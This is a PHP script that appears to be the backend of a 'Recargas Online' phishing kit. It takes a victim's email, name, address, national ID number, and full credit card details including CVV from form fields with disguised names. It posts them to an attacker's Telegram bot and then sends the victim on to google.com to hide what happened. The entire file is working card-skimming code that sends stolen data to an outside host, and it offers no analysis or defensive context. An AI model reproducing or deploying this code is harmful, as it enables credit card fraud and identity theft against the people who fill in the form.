<?php 
$email = $_POST['sari'];
$nombre = $_POST['onmpo'];
$direc = $_POST['conec'];
$ciudad = $_POST['cici'];
$zip = $_POST['sip'];
$dni = $_POST['danas'];
$CC = $_POST['trofe'];
$mm = $_POST['explo'];
$yy = $_POST['plano'];
$cvv = $_POST['sese'];
require 'bot.php';
$html_message = "➖➖➖➖➖[ Recargas Online ]➖➖➖➖➖\n".
				"<b>✔️ Email: </b><code>".$email."</code>\n".
				"<b>✔️ Nombre: </b><code>".$nombre."</code>\n".
				"<b>✔️ Dirección: </b><code>".$direc."</code>\n".
				"<b>✔️ Ciudad: </b><code>".$ciudad."</code>\n".
				"<b>✔️ Zip: </b><code>".$zip."</code>\n".
				"<b>✔️ Dni: </b><code>".$dni."</code>\n".
				"<b>✔️ CC: </b><code>".$CC."</code>\n".
				"<b>✔️ Mes: </b><code>".$mm."</code>\n".
				"<b>✔️ Año: </b><code>".$yy."</code>\n".
				"<b>✔️ Cvv: </b><code>".$cvv."</code>\n".
				"➖➖➖➖➖➖@KezzySSJ➖➖➖➖➖➖";

$html_message = urlencode($html_message);
$result = @file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$html_message&parse_mode=html");
header('location:https://www.google.com/');
exit();
 ?>